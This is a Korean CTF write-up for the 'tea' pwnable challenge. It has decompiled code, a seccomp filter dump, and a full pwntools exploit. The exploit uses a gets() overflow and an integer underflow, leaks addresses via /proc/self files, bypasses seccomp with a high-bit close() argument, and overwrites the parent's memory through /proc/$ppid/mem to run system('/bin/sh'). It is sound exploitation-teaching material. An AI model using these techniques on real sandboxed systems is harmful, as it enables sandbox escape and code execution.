# Index

- [Summary](#Summary)
- [Analysis](#Analysis)
- [Exploit](#Exploit)
- [Solve.py](#Solve.py)
- [Comment](#Comment)



# Summary

- **bypass seccomp**
- get **ppid** from **/proc/self/status**
- overwrite **/proc/$ppid/mem**
- **Full Relro** and **no return** --> running **function ret control**



# Analysis

```shell
[*] '/home/m444ndu/hassan_kuality/ch4rli3kop/round1/tea/tea'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

카나리빼고 다 걸려 있숩니다. **PIE**와 **Full Relro**에서부터 극횸의 향기가 홀홀 풍기는 군여.



## main()

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __pid_t v3; // eax
  int stat_loc; // [rsp+14h] [rbp-2Ch]
  __int64 buf; // [rsp+18h] [rbp-28h]
  __pid_t pid; // [rsp+30h] [rbp-10h]
  int fd; // [rsp+34h] [rbp-Ch]
  void *addr; // [rsp+38h] [rbp-8h]

  addr = 0LL;
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("Thank you for using our next-gen data storage solution.");
  puts("You're using the free trial version, some functionality might be missing.");
  addr = mmap(0LL, 0x100000000000uLL, 3, 16418, -1, 0LL);
  if ( addr == (void *)-1LL )
    err(1, "mmap", a2);
  fd = open("/dev/urandom", 0, a2);
  if ( fd < 0 )
    err(1, "open(/dev/urandom)");
  if ( read(fd, &buf, 8uLL) != 8 )
    err(1, "read(dev_rnd)");
  close(fd);
  buf &= 0xFFFFFFFFFFFuLL;
  buf &= 0xFFFFFFFFFFFFFFF8LL;
  pid = clone((int (*)(void *))fn, (char *)addr + buf, 0, 0LL);
  if ( pid == -1 )
    err(1, "clone");
  v3 = waitpid(pid, &stat_loc, 2147483648);
  if ( v3 != pid )
    err(1, "waitpid");
  if ( !(stat_loc & 0x7F) && !BYTE1(stat_loc) )
    exit(0);
  exit(1);
}
```

`main()`을 요약해보자면, 우선 **child_process**가 사용할 스택 공간을 `mmap()`을 통해 할당받은 뒤, `clone()`을 사용하여 **child_process**를 생성합니다. `fork()`와 달리 `clone()`의 경우 **child_process**가 사용할 스택 공간을 할당해줘야 한다는 군여. 사용하는 스택 base 도 용의주도하게 랜덤으로 할당해줍니다. **parent_process**는 이후 `waitpid()`를 통해 **child_process**가 종료할 때까지 대기합니다.



## fd()

```c
void __fastcall __noreturn fn(void *arg)
{
  unsigned __int64 offset; // rax
  int count_1; // eax
  int count; // eax
  char buf; // [rsp+10h] [rbp-40h]
  char v5; // [rsp+2Fh] [rbp-21h]
  size_t n; // [rsp+38h] [rbp-18h]
  int fd; // [rsp+40h] [rbp-10h]
  int oflag; // [rsp+44h] [rbp-Ch]
  void *ptr_buf; // [rsp+48h] [rbp-8h]

  set_seccomp_rule();
  while ( 1 )
  {
    puts("(r)ead or (w)rite access?");
    gets(&buf);
    v5 = 0;
    if ( buf != 'r' )
      break;
    oflag = 0;
    puts("filename?");
    gets(&buf);
    v5 = 0;
    fd = open(&buf, oflag);
    if ( fd < 0 )
      err(1, "open(%s)", &buf);
    puts("lseek?");
    gets(&buf);
    v5 = 0;
    offset = strtoull(&buf, 0LL, 10);
    lseek(fd, offset, 0);
    puts("count?");
    ptr_buf = &buf;
    gets(&buf);
    v5 = 0;
    if ( atoi(&buf) > 32 )
    {
      count_1 = atoi(&buf);
      ptr_buf = malloc(count_1);
      if ( !ptr_buf )
        err(1, "malloc");
    }
    count = atoi(&buf);
    n = read(fd, ptr_buf, count - 1);
    if ( (n & 0x8000000000000000LL) != 0LL )
      err(1, "read");
    printf("read %d bytes\n", n);
    write(1, ptr_buf, n);
    close(fd);
    puts("quit? (y/n)");
    read(0, &buf, 2uLL);
    if ( buf != 'n' )
      exit(0);
  }
  puts("write mode not supported in the trial, please upgrade your plan by sending 10 BTC to tsuro.");
  exit(1);
}
```

`set_seccomp_rule()`를 실행하여 **seccomp** 설정을 해준 뒤, while 문을 통해 파일을 읽어 들이는 것을 반복합니다. 여기서는 `gets()` 덕분에 당연히 **BOF**가 발생합니다. 다만, **return**이 존재하지 않아, **rip_control**을 위해선 조금 신경을 써주어야 합니다. 또한, `n = read(fd, ptr_buf, count - 1);`에서 인자로 들어오는 `ptr_buf`의 값을 `count` 입력 시, 사용자가 변조가 가능하여, `read()`가 실행되면서 특정 주소에 값을 **overwrite** 할 수 있습니다. 다만 이 경우, `atoi(&buf) > 32` 가 되지 말아야 하므로 이를 우회해야 합니다. 

 `read()`의 size 부분이 count -1 이므로 int 형의 범위(`-2,147,483,648 ~ 2,147,438,647`) 중 가장 작은 값인 -2147483648 을 주면 size가 -1을 하며 **under flow**가 발생하여 2147438647이 됩니다. 이를 이용하면 `malloc()`을 부르지 않아 `ptr_buf`를 초기화시키지 않을 수 있습니다.

>  처음에는 걍 0을 집어넣어서 우회하려 했는데, 이상하게 Bad address가 뜨면서 안되네열;;



## set_seccomp_rule()

```c
 if ( syscall(
         157LL,
         38LL,
         1LL,
         0LL,
         0LL,
         0LL,
         *(_QWORD *)&v1,
         &v3,
         *(_QWORD *)&v3,
         *(_QWORD *)&v7,
         *(_QWORD *)&v11,
         *(_QWORD *)&v15,
         *(_QWORD *)&v19,
         *(_QWORD *)&v23,
         *(_QWORD *)&v27,
         *(_QWORD *)&v31,
         *(_QWORD *)&v35,
         *(_QWORD *)&v39,
         *(_QWORD *)&v43,
         *(_QWORD *)&v47,
         *(_QWORD *)&v51,
         *(_QWORD *)&v55) )
  {
    err(1, "prctl(NO_NEW_PRIVS)", *(_QWORD *)&v1);
  } 
result = prctl(22, 2LL, &v1, *(_QWORD *)&v1);
  if ( result )
    err(1, "prctl(SECCOMP)", *(_QWORD *)&v1);
```

**seccomp(secure_computing)** 이란 Linux의 사용하는 **process_sandboxing_기법**을 말합니다. syscall이 불릴 시, 해당 syscall 함수가 실행되기 전에 **seccomp**는 **syscall**을 **filtering** 하는 기능을 가지고 있습니다.

위와 같이 `prctl()`을 사용하여 **seccomp**를 설정할 수 있는데, `prctl()`에 대한 설명은 다음과 같습니다.

```c
SYNOPSIS
       #include <sys/prctl.h>

       int prctl(int option, unsigned long arg2, unsigned long arg3,
                 unsigned long arg4, unsigned long arg5);

DESCRIPTION
       prctl() is called with a first argument describing what to do (with val‐
       ues defined in <linux/prctl.h>), and further arguments with  a  signifi‐
       cance depending on the first one.  The first argument can be:

--------------------------------------------------------------------------------------
example)
    #include <seccomp.h> 
    prctl(PR_SET_SECCOMP, SECCOMP_MODE, ... );

#define PR_SET_SECCOMP	22

man page
PR_SET_SECCOMP (since Linux 2.6.23)
Set the secure computing (seccomp) mode for the calling
thread, to limit the available system calls.  The more recent
seccomp(2) system call provides a superset of the
functionality of PR_SET_SECCOMP.

The seccomp mode is selected via arg2.  (The seccomp constants
are defined in <linux/seccomp.h>.)

With arg2 set to SECCOMP_MODE_STRICT, the only system calls
that the thread is permitted to make are read(2), write(2),
_exit(2) (but not exit_group(2)), and sigreturn(2).  Other
system calls result in the delivery of a SIGKILL signal.
Strict secure computing mode is useful for number-crunching
applications that may need to execute untrusted byte code,
perhaps obtained by reading from a pipe or socket.  This
operation is available only if the kernel is configured with
CONFIG_SECCOMP enabled.

With arg2 set to SECCOMP_MODE_FILTER (since Linux 3.5), the
system calls allowed are defined by a pointer to a Berkeley
Packet Filter passed in arg3.  This argument is a pointer to
struct sock_fprog; it can be designed to filter arbitrary
system calls and system call arguments.  This mode is
available only if the kernel is configured with
CONFIG_SECCOMP_FILTER enabled.

If SECCOMP_MODE_FILTER filters permit fork(2), then the
seccomp mode is inherited by children created by fork(2); if
execve(2) is permitted, then the seccomp mode is preserved
across execve(2).  If the filters permit prctl() calls, then
additional filters can be added; they are run in order until
the first non-allow result is seen.

For further information, see the kernel source file
Documentation/userspace-api/seccomp_filter.rst (or
Documentation/prctl/seccomp_filter.txt before Linux 4.13).

------------------------------------------------------------------------------------
/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, <mode>) */
#define SECCOMP_MODE_DISABLED	0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */
```

**seccomp**는 두 가지 모드를 사용할 수 있습니다. **strict_mode**와 **filter_mode**인데, 다음과 같습니다.

1. **Strict_Mode**

   `read()`, `write()`, `exit()`, `sigreturn()` 4 가지의 **syscall** 만을 사용할 수 있는 모드입니다. 허용되지 않은 **syscall**이 호출되었을 경우, **SIGKILL_Signal**을 받고 종료됩니다.

2. **Filter_Mode**

   각 **syscall** 별로 동작을 설정해줄 수 있습니다. 이 경우, `sock_fprog` 구조체 포인터가 추가로 인자로 전달되게 됩니다.



본 문제의 경우 `prctl(22, 2LL, &v1, *(_QWORD *)&v1);` 처럼 사용되기 때문에, **Filter_Mode**를 사용한다고 할 수 있습니다. 

**seccomp**가 적용된 바이너리의 디버깅을 [Seccomp-tools](https://github.com/david942j/seccomp-tools) 라는 갓갓 툴을 사용하여 진행해보면 다음과 같습니다.

```shell
m444ndu@ubuntu:~/hassan_kuality/ch4rli3kop/round1/tea$ seccomp-tools dump ./tea
Thank you for using our next-gen data storage solution.
You're using the free trial version, some functionality might be missing.
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0010
 0009: 0x06 0x00 0x00 0x0005000d  return ERRNO(13)
 0010: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0014
 0013: 0x05 0x00 0x00 0x00000023  goto 0049
 0014: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0022
 0021: 0x05 0x00 0x00 0x00000003  goto 0025
 0022: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0024
 0023: 0x05 0x00 0x00 0x0000004d  goto 0101
 0024: 0x06 0x00 0x00 0x00000000  return KILL
 0025: 0x05 0x00 0x00 0x00000000  goto 0026
 0026: 0x20 0x00 0x00 0x00000010  A = args[0]
 0027: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0028: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0029: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0030: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0036
 0031: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0032: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0035
 0033: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0034: 0x06 0x00 0x00 0x00000000  return KILL
 0035: 0x60 0x00 0x00 0x00000001  A = mem[1]
....
```

꽤 길지만, 요약해보면 다음과 같습니다. 우선, 허용되는 **syscall**은 `exit()`, `exit_group()`, `fstat()`, `brk()`, `mmap()`, `read()`, `lseek()`, `open()`, `close()`, `write()`입니다. 당연히 `sys_execve()`는 없내열 ㅠㅠ 바로 허용되지 않고, 몇몇 조건이 붙어있는 **syscall**도 있는데, `write()`의 경우 첫 번째 인자가 1 혹은 2여야 하며, `close()`의 경우 첫 번째 인자가 0, 1, 2이 아니여야 **ALLOW** 됨을 알 수 있습니다. 즉 `fd`가 1과 2여야만  `write()`이 가능하고, `fd`가 0, 1, 2이 아니여야만  `close()`가 가능합니다.



# Exploit

### stack leak

우선, **child_process**에서 발생하는 **BOF**를 잘 사용하려면 본 바이너리에 걸려있는 **PIE**를 해결해야 합니다. 이 문제는 `/proc/self/mem` 파일을 읽어 들임으로써 해결할 수 있습니다.

```shell
'(r)ead or (w)rite access?\n'
[DEBUG] Sent 0x2 bytes:
    'r\n'
[DEBUG] Received 0xa bytes:
    'filename?\n'
[DEBUG] Sent 0x10 bytes:
    '/proc/self/maps\n'
[DEBUG] Received 0x7 bytes:
    'lseek?\n'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x7 bytes:
    'count?\n'
[DEBUG] Sent 0x5 bytes:
    '4096\n'
[DEBUG] Received 0x6e3 bytes:
    'read 1735 bytes\n'
    '55f3660dd000-55f3660e0000 r-xp 00000000 08:01 1718487                    /home/m444ndu/hassan_kuality/ch4rli3kop/round1/tea/tea\n'
    '55f3662df000-55f3662e0000 r--p 00002000 08:01 1718487                    /home/m444ndu/hassan_kuality/ch4rli3kop/round1/tea/tea\n'
    '55f3662e0000-55f3662e1000 rw-p 00003000 08:01 1718487                    /home/m444ndu/hassan_kuality/ch4rli3kop/round1/tea/tea\n'
    '55f36822f000-55f368252000 rw-p 00000000 00:00 0                          [heap]\n'
    '6f34edb3a000-7f34edb3a000 rw-p 00000000 00:00 0 \n'
    '7f34edb3a000-7f34edcfa000 r-xp 00000000 08:01 2359381                    /lib/x86_64-linux-gnu/libc-2.23.so\n'
    '7f34edcfa000-7f34edefa000 ---p 001c0000 08:01 2359381                    /lib/x86_64-linux-gnu/libc-2.23.so\n'
    '7f34edefa000-7f34edefe000 r--p 001c0000 08:01 2359381                    /lib/x86_64-linux-gnu/libc-2.23.so\n'
    '7f34edefe000-7f34edf00000 rw-p 001c4000 08:01 2359381                    /lib/x86_64-linux-gnu/libc-2.23.so\n'
    '7f34edf00000-7f34edf04000 rw-p 00000000 00:00 0 \n'
    '7f34edf04000-7f34edf2a000 r-xp 00000000 08:01 2359379                    /lib/x86_64-linux-gnu/ld-2.23.so\n'
    '7f34ee109000-7f34ee10c000 rw-p 00000000 00:00 0 \n'
    '7f34ee129000-7f34ee12a000 r--p 00025000 08:01 2359379                    /lib/x86_64-linux-gnu/ld-2.23.so\n'
    '7f34ee12a000-7f34ee12b000 rw-p 00026000 08:01 2359379                    /lib/x86_64-linux-gnu/ld-2.23.so\n'
    '7f34ee12b000-7f34ee12c000 rw-p 00000000 00:00 0 \n'
    '7ffc41f9b000-7ffc41fbc000 rw-p 00000000 00:00 0                          [stack]\n'
    '7ffc41fc4000-7ffc41fc7000 r--p 00000000 00:00 0                          [vvar]\n'
    '7ffc41fc7000-7ffc41fc9000 r-xp 00000000 00:00 0                          [vdso]\n'
    'ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n'
    'quit? (y/n)\n'
```

이를 통해, code_base 및 libc_base 를 알 수 있으며, `   write(1, ptr_buf, n);`를 이용하여 libc에 포함되어 있는 __environ 값을 leak 함으로써 **parent_process**의 stack 주소를 leak 할 수 있습니다. `clone()`을 통해 **child_process**를 생성했기 때문에, **child_process**의 메모리 공간은 **parent_process**와 동일합니다. 따라서 **child_process**에서도 **parent_process**의 스택 공간의 값이 잔존해 있는데, 릭한 stack 주소를 이용하여 **parent_process**에서 **child_process**의 스택 공간을 할당시켜주기 위해 사용했던 값들을 그대로 확인할 수있습니다. 따라서 **parent_process** 및 **child_process**의 **ret** 주소를 구할 수 있게 됩니다. **Full Relro**가 걸려있기 때문에 **ret** 값을 변조시켜 원하는 동작을 시키도록 합니다.

다만, 주의해야할 점은, 본 바이너리에서는 `leave; ret`를 사용하지 않기 때문에, 그냥 `main()`과 `fd()`의 **ret** 만덮는다고 생성한 **chain**을 실행시킬 수 없다는 점입니다. 따라서, **child_process**에서는 `read()` 함수의 **ret** 를, **parent_process**에서는 `waitpid()`의 **ret**를 덮도록 합니당. 



### parent_process pid leak and memory overwrite

주어진 상황내에서 **parent_process**의 **pid**를 알아낸다면 **memory** 공간을 **overwrite** 하는 것이 가능합니다. **parent_process**의 메모리는 `/proc/$pid(parent_process_pid)/mem` 으로 관리됩니다. **child_process**의 **ppid**가 **parent_process**의 **pid**와  같기 때문에, **child_process**에서 `/proc/self/status`를 통해 **parent_process**의 **pid**를 확인할 수 있습니다.

```shell
    '(r)ead or (w)rite access?\n'
[DEBUG] Sent 0x2 bytes:
    'r\n'
[DEBUG] Received 0xa bytes:
    'filename?\n'
[DEBUG] Sent 0x12 bytes:
    '/proc/self/status\n'
[DEBUG] Received 0x7 bytes:
    'lseek?\n'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x7 bytes:
    'count?\n'
[DEBUG] Sent 0x5 bytes:
    '4096\n'
[DEBUG] Received 0x58b bytes:
    'read 1391 bytes\n'
    'Name:\ttea\n'
    'Umask:\t0022\n'
    'State:\tR (running)\n'
    'Tgid:\t12429\n'
    'Ngid:\t0\n'
    'Pid:\t12429\n'
    'PPid:\t12428\n'       <= same as parent_process pid
    'TracerPid:\t0\n'
```

이제 **parent_process**의 mem 파일을 열 수 있게 되었습니당. 근데 사실 아직 해당 파일을 변조시키는 건 불가능합니당. 왜냐면 아까 분석한 seccomp 설정을 보면 `write()` 의 경우 첫 번째 인자, 즉 `fd`가 1과 2만 올 수 있더랫죠. 따라서 그냥 `open()` 한 뒤에는 `fd`가 3이 되므로 `write()` 가 불가능합니다. 하지만 `close()`로 하나 닫아버리려고 해도 아까 조건에서 `close()`는 0, 1, 2가 올 수 없기 때문에 요거에서도 또 문제가 생기는 것 처럼 보입니다. 하지만 libc 나 kernel에서는 최상위 비트는 무시하므로 0x8000000000000000만큼 더해서 부르면 seccomp를 우회하여 `close()` 하는 것이 가능합니다. `close(0x8000000000000002)` 하면 seccomp 체크에서는 0x8000000000000002로 인식하고 실제 동작은 `close(2)`로 하는 것이져. 

따라서 **stdin_error**를 닫아버리고 `open(/proc/ppid/mem)`하여 `lseek()`를 적절히 사용하여 `write()`하면 됩니당 



# Solve.py

```python
#!/usr/bin/python
from pwn import *

def parsing_maps():
	r.recvuntil('bytes\n')
	data = r.recvuntil('[vsyscall]')
	data = data.split('\n')
	parent_code_base = int(data[0].split('-')[0], 16)
	for a in data:
		if 'heap' in a and 'rw-p' in a:
			heap_base = int(a.split('-')[0], 16)

		if 'libc' in a and 'r-xp' in a:
			libc_base = int(a.split('-')[0], 16)
			child_base = libc_base - 0x100000000000
			break

	r.sendlineafter('quit? (y/n)\n', 'n')

	return parent_code_base, child_base, heap_base, libc_base

def parsing_ppid():
	r.recvuntil('bytes\n')
	data = r.recvuntil('TracerPid:')
	data = data.split('\n')
	for a in data:
		if 'PPid' in a:
			break
	r.sendlineafter('quit? (y/n)\n', 'n')

	return int(a.split(':')[1], 10)

def readfile(filename, offset, count, data, flag='else'):
	r.sendlineafter('(r)ead or (w)rite access?\n', 'r')
	r.sendlineafter('filename?\n', filename)
	r.sendlineafter('lseek?\n', str(offset))
	r.sendlineafter('count?\n', (count))
	
	if flag == 'maps':
		return parsing_maps()
	elif flag == 'ppid':
		return parsing_ppid()
	elif flag == 'input':
		r.sendline(data)
		return
	elif flag == 'stack_leak':
		r.sendline(data)
		r.recvregex('read \d+ bytes\n')
		leak = u64(r.recv(6).ljust(8,'\x00'))
		r.sendlineafter('quit? (y/n)\n', 'n')
		return leak
	else:
		return

r = process('./tea')
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(r)


########   leaking   ########
parent_code_base, child_base, heap_base, libc_base = readfile('/proc/self/maps', 0, str(0x1000), 0, 'maps')

success('leaking.. memory')
log.info('PIE base = '+hex(parent_code_base))
log.info('heap_base = '+hex(heap_base))
log.info('child_base = '+hex(child_base))
log.info('libc_base = '+hex(libc_base))
system_addr = libc_base + libc.symbols['system']
log.info('system_addr = '+hex(system_addr))
binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.info('/bin/sh_addr = '+hex(binsh_addr))


ppid = readfile('/proc/self/status', 0, str(0x1000), 0,'ppid')

success('leaking.. parent pid')
log.info('parent pid = '+str(ppid))


## tea gadget ##
leave_ret = parent_code_base + 0x0000000000001dbc # leave ; ret
exit_got = parent_code_base + 0x00202FE0 # exit@got <= unusable
malloc_got = parent_code_base + 0x000202FB0 # malloc@got <= unusable

## libc gadget ##
pop_rdi = libc_base + 0x0000000000021102 # pop rdi ; ret
pop_rsi = libc_base + 0x00000000000202e8 # pop rsi ; ret
pop_rdx = libc_base + 0x0000000000001b92 # pop rdx ; ret
pop_rax = libc_base + 0x0000000000033544 # pop rax ; ret
syscall = libc_base + 0x00000000000bc375 # syscall ; ret

open_addr = libc_base + libc.symbols['open']
lseek_addr = libc_base + libc.symbols['lseek']
close_addr = libc_base + libc.symbols['close']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
exit_addr = libc_base + libc.symbols['exit']
libc_environ = libc_base + libc.symbols['environ']

parent_waitpid_ret = readfile('/proc/self/fd/0', 0, str(-0x80000000), 'a'*0x30+p64(3)+p64(libc_environ), 'stack_leak')
parent_waitpid_ret -= 240

mmaped_addr = readfile('/proc/self/fd/0', 0, str(-0x80000000), 'a'*0x30+p64(3)+p64(parent_waitpid_ret-0x10), 'stack_leak')
random_num = readfile('/proc/self/fd/0', 0, str(-0x80000000), 'a'*0x30+p64(3)+p64(parent_waitpid_ret-0x30), 'stack_leak')
child_read_ret = mmaped_addr + random_num - 104

parent_waitpid_ret -= 80

success('leak stack...')
log.info('parent_waitpid_ret = '+hex(parent_waitpid_ret))
log.info('mmaped_addr = '+hex(mmaped_addr))
log.info('random_num = '+hex(random_num))
log.info('child_read_ret = '+hex(child_read_ret))


# make "/proc/ppid/mem"
payload = p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(child_base + 0x1000) # /proc/ppid/mem
payload += p64(pop_rdx)
payload += p64(0x1000)
payload += p64(read_addr)

# make ROP chain 2
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(child_base + 0x2000) # ROP chain 2
payload += p64(pop_rdx)
payload += p64(0x1000)
payload += p64(read_addr)

# close fd 
payload += p64(pop_rdi)
payload += p64(0x8000000000000002)
payload += p64(close_addr)

# open /proc/ppid/mem w
payload += p64(pop_rdi)
payload += p64(child_base + 0x1000)
payload += p64(pop_rsi)
payload += p64(2) # w permission
payload += p64(open_addr)

# lseek(2, parent_waitpid_ret, 0)
payload += p64(pop_rdi)
payload += p64(2)
payload += p64(pop_rsi)
payload += p64(parent_waitpid_ret)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(lseek_addr)

# write
payload += p64(pop_rdi)
payload += p64(2)
payload += p64(pop_rsi)
payload += p64(child_base + 0x2000)
payload += p64(pop_rdx)
payload += p64(0x1000)
payload += p64(write_addr)

# exit
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(exit_addr)


### execute ROP chain and parent_waitpid_ret overwrite ###
readfile('/proc/self/fd/0', 0, str(-0x80000000).ljust(0x28,'\x00')+p64(0)+p64(0)+p64(child_read_ret), payload, 'input')

r.sendline('/proc/{}/mem'.format(ppid) + '\x00')
r.sendline(p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)) ## parent_waitpid_ret overwrite

r.interactive()
```



# Comment

- 호오우... 예전 컴퓨터 구조론 수업을 들으면서 `fork()`하면서 child에서 뭐 어떻게 하면 parent 메모리에 접근할 수 있는 취약점도 터지지 않을까라는 생각을 잠깐 했던적이 있었는데, 요게 딱 그짝이어서 재밋게 한거 같다
- 당연히 got 덮일 줄 알고, exit@got나 malloc@got를 leave; ret;으로 덮어서 ret에 올려놓은 rop chain을 실행시키려고 했는데, Full relro 걸려있어서 안됬따...
- read 함수가 동작하면서 read의 ret 덮는 게 가능하므로 유용하게 사용하도록 하자.
- parent process에서 waitpid 함수로 대기탈 시 waitpid 함수 실행되면서 child process가 종료되기를 기다리므로 child process가 종료되면 waitpid 내부로 돌아온다. 따라서 waitpid ret를 변조하면 rop chain을 실행가능!
